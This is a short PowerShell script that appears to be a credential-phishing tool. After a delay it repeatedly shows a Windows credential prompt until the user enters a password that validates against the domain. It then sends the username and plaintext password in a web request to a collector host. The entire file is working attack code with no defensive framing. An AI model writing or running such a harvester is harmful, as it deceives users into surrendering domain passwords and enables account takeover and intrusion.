$sleep_time = 30

$collector_host = "127.0.0.1:8000"

$not_validated = $true
Start-Sleep -s $sleep_time
While ($not_validated) {
    Start-Sleep -s 5
    $credential = Get-Credential
    

    $username = $credential.username
    $password = $credential.GetNetworkCredential().password



    function Test-Credential {
        param(
            [parameter(Mandatory=$true,ValueFromPipeline=$true)]
            [System.Management.Automation.PSCredential]$credential,
            [parameter()][validateset('Domain','Machine','ApplicationDirectory')]
            [string]$context = 'Domain'
        )
        begin {
            Add-Type -assemblyname system.DirectoryServices.accountmanagement
            $DS = New-Object System.DirectoryServices.AccountManagement.PrincipalContext([System.DirectoryServices.AccountManagement.ContextType]::$context) 
        }
        process {
            $DS.ValidateCredentials($credential.UserName, $credential.GetNetworkCredential().password)
        }


    }




    If(Test-Credential($credential)) {
        #Send Password
        Invoke-WebRequest -Uri "$collector_host/${username}:${password}"
        $not_validated = $false
    } 
}